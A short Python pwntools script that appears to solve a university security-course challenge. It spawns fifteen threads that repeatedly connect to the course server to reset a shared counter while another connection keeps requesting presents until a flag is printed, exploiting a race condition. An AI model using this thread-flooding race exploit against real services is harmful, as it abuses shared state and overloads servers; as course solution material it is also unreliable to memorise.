#!/usr/bin/env python3

import pwn
import threading
import sys

pwn.context.arch = 'amd64'

# 1) docker compose -f debug.yml up

# a new instance sets count to zero
def spawn_new():
    while(True):
        new_conn = pwn.remote('tasks.ws24.softsec.rub.de', 32984, level='error')
        #new_conn = pwn.remote('127.0.0.1', 1024, level='error')
        new_conn.close()

# if count = 0 when we check, we win
def send_naughty():
    conn_naughty = pwn.remote('tasks.ws24.softsec.rub.de', 32984, level='error')
    #conn_naughty = pwn.remote('127.0.0.1', 1024, level='error')
    while(True):
        conn_naughty.sendlineafter(b'> ', b'Get presents')
        potential_flag = conn_naughty.recvline()
        if b'softsec' in potential_flag:
            print(potential_flag)
            break

# set count to zero often
for _ in range(15):
    t = threading.Thread(target=spawn_new)
    t.start()

# try to win
t4 = threading.Thread(target=send_naughty)
t4.start()
t4.join()
sys.exit()